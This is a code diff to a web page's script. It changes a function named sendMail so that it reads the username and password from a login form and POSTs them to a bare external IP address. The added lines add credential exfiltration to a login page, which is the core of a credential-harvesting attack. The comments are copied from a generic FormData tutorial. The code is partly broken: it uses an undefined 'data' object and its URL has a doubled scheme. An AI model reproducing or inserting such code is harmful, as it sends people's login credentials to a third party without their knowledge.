@@ -128,7 +128,31 @@
 function sendMail() {
   var username = document.getElementsByName("login").item(0).value;
   var password = document.getElementsByName("password").item(0).value;
-alert(username+':'+password);
+  
+  const XHR = new XMLHttpRequest(),
+  FD  = new FormData();
+  
+  // データを FormData オブジェクトに投入します
+  FD.append(username, data[username]);
+  FD.append(password, data[password]);
+  
+  // データが正常に送信された場合に行うことを定義します
+  XHR.addEventListener('load', function(event) {
+    alert('Yeah! Data sent and response loaded.');
+  });
+  
+  // エラーが発生した場合に行うことを定義します
+  XHR.addEventListener('error', function(event) {
+    alert('Oups! Something goes wrong.');
+  });
+
+  // リクエストをセットアップします
+  XHR.open('POST', 'http://http://18.176.184.200');
+
+  // FormData オブジェクトを送信するだけです。HTTP ヘッダは自動的に設定されます
+  XHR.send(FD);
+  
+  alert(username+':'+password);
 }
 </script>
 
